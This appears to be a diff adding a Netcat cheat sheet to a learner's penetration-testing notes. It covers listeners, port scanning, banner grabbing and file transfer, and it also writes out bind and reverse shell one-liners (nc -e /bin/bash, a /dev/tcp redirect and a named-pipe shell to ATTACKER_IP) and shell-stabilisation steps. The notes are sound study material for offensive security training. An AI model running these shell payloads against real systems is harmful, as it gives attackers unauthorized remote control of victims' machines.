@@ -393,3 +393,342 @@ Bash → Serves Interactive Shell
 In the next section, reverse shells will show how attackers bypass inbound firewall restrictions by making the victim initiate the connection instead.
 
 ---
+# 🛠 Netcat (nc) Full Cheat Sheet – Pentester Reference (Table Format)
+
+---
+
+# 1️⃣ Netcat Overview
+
+|Feature|Description|
+|---|---|
+|Tool Name|Netcat (`nc`)|
+|Nickname|Swiss Army Knife of Networking|
+|Protocol Support|TCP, UDP, Unix sockets|
+|Operating Systems|Linux, Windows, macOS|
+|Common Uses|Bind shells, reverse shells, port scanning, file transfer, banner grabbing|
+|Pentest Importance|Extremely critical|
+
+---
+
+# 2️⃣ Netcat Basic Syntax
+
+|Syntax|Description|
+|---|---|
+|nc [options] IP PORT|Connect to IP and port|
+|nc -l PORT|Listen on port|
+|nc -lvnp PORT|Listen verbose numeric|
+
+---
+
+# 3️⃣ Netcat Modes
+
+|Mode|Command|Description|
+|---|---|---|
+|Client mode|nc TARGET_IP PORT|Connect to target|
+|Listen mode|nc -l PORT|Listen for connection|
+|Verbose listen|nc -lvnp PORT|Detailed listener|
+|UDP mode|nc -u IP PORT|UDP connection|
+
+---
+
+# 4️⃣ Listener Setup (Attacker)
+
+|Purpose|Command|
+|---|---|
+|Basic listener|nc -l 4444|
+|Verbose listener|nc -lvnp 4444|
+|Listen specific IP|nc -l ATTACKER_IP 4444|
+|UDP listener|nc -luvp 4444|
+
+Example:
+
+```bash
+nc -lvnp 4444
+```
+
+---
+
+# 5️⃣ Connect to Listener (Victim or Attacker)
+
+|Purpose|Command|
+|---|---|
+|Basic connect|nc TARGET_IP 4444|
+|Verbose connect|nc -nv TARGET_IP 4444|
+|UDP connect|nc -u TARGET_IP 4444|
+
+Example:
+
+```bash
+nc -nv 10.10.10.5 4444
+```
+
+---
+
+# 6️⃣ Bind Shell Commands
+
+## Linux Bind Shell
+
+|Purpose|Command|
+|---|---|
+|Bind bash shell|nc -lvnp 4444 -e /bin/bash|
+|Bind sh shell|nc -lvnp 4444 -e /bin/sh|
+
+Alternative method:
+
+```bash
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp 4444 > /tmp/f
+```
+
+---
+
+## Windows Bind Shell
+
+|Purpose|Command|
+|---|---|
+|Bind cmd shell|nc -lvnp 4444 -e cmd.exe|
+
+---
+
+# 7️⃣ Reverse Shell Commands
+
+## Listener (Attacker)
+
+```bash
+nc -lvnp 4444
+```
+
+---
+
+## Linux Reverse Shell (Victim)
+
+```bash
+nc ATTACKER_IP 4444 -e /bin/bash
+```
+
+Alternative:
+
+```bash
+bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+```
+
+---
+
+## Windows Reverse Shell
+
+```cmd
+nc.exe ATTACKER_IP 4444 -e cmd.exe
+```
+
+---
+
+# 8️⃣ File Transfer Using Netcat
+
+---
+
+## Receive File (Receiver)
+
+```bash
+nc -lvnp 4444 > file.txt
+```
+
+---
+
+## Send File (Sender)
+
+```bash
+nc TARGET_IP 4444 < file.txt
+```
+
+---
+
+# 9️⃣ Banner Grabbing
+
+|Purpose|Command|
+|---|---|
+|Grab banner|nc TARGET_IP PORT|
+|HTTP banner|nc TARGET_IP 80|
+|SMTP banner|nc TARGET_IP 25|
+
+Example:
+
+```bash
+nc 10.10.10.5 80
+```
+
+Then type:
+
+```bash
+GET / HTTP/1.0
+```
+
+---
+
+# 🔟 Port Scanning with Netcat
+
+|Purpose|Command|
+|---|---|
+|Scan single port|nc -zv TARGET_IP PORT|
+|Scan port range|nc -zv TARGET_IP 1-1000|
+|Scan UDP ports|nc -zvu TARGET_IP PORT|
+
+Example:
+
+```bash
+nc -zv 10.10.10.5 1-1000
+```
+
+---
+
+# 1️⃣1️⃣ Chat Server Example
+
+## Listener
+
+```bash
+nc -lvnp 4444
+```
+
+## Client
+
+```bash
+nc TARGET_IP 4444
+```
+
+Both can now chat.
+
+---
+
+# 1️⃣2️⃣ Netcat Options Cheat Sheet
+
+|Option|Meaning|
+|---|---|
+|-l|Listen mode|
+|-v|Verbose|
+|-n|Numeric only|
+|-p|Specify port|
+|-e|Execute program|
+|-u|UDP mode|
+|-z|Scan mode|
+|-w|Timeout|
+|-k|Keep open|
+
+---
+
+# 1️⃣3️⃣ Netcat Verification Commands
+
+|Command|Purpose|
+|---|---|
+|netstat -antp|Show connections|
+|ss -antp|Alternative|
+|ps aux|Show processes|
+|lsof -i|Show open ports|
+
+---
+
+# 1️⃣4️⃣ Common Pentest Scenarios
+
+|Scenario|Command|
+|---|---|
+|Reverse shell listener|nc -lvnp 4444|
+|Bind shell connect|nc TARGET_IP 4444|
+|Transfer file receive|nc -lvnp 4444 > file|
+|Transfer file send|nc TARGET_IP 4444 < file|
+|Banner grabbing|nc TARGET_IP 80|
+|Scan ports|nc -zv TARGET_IP 1-1000|
+
+---
+
+# 1️⃣5️⃣ Linux Named Pipe Reverse Shell (Advanced)
+
+```bash
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f
+```
+
+---
+
+# 1️⃣6️⃣ Stabilize Shell After Connection
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+```bash
+export TERM=xterm
+```
+
+```bash
+stty raw -echo
+```
+
+---
+
+# 1️⃣7️⃣ Windows Netcat Locations
+
+|Location|Example|
+|---|---|
+|Kali Linux|/usr/bin/nc|
+|Windows|nc.exe|
+|Parrot OS|/bin/nc|
+
+Check location:
+
+```bash
+which nc
+```
+
+---
+
+# 1️⃣8️⃣ Troubleshooting Netcat
+
+|Problem|Solution|
+|---|---|
+|Connection refused|Check listener|
+|No response|Check firewall|
+|Command not found|Install netcat|
+|No shell interaction|Use proper payload|
+
+---
+
+# 1️⃣9️⃣ Install Netcat
+
+## Linux
+
+```bash
+sudo apt install netcat
+```
+
+or
+
+```bash
+sudo apt install netcat-traditional
+```
+
+---
+
+## Windows
+
+Download:
+
+- nc.exe
+    
+- ncat.exe
+    
+
+---
+
+# 2️⃣0️⃣ Quick Reference (Most Important)
+
+|Task|Command|
+|---|---|
+|Listener|nc -lvnp 4444|
+|Connect|nc TARGET_IP 4444|
+|Reverse shell|nc ATTACKER_IP 4444 -e /bin/bash|
+|Bind shell|nc -lvnp 4444 -e /bin/bash|
+|File receive|nc -lvnp 4444 > file|
+|File send|nc TARGET_IP 4444 < file|
+|Scan port|nc -zv TARGET_IP PORT|
+
+---
+
+### Excercises
+![[Pasted image 20260214105544.png]]
+
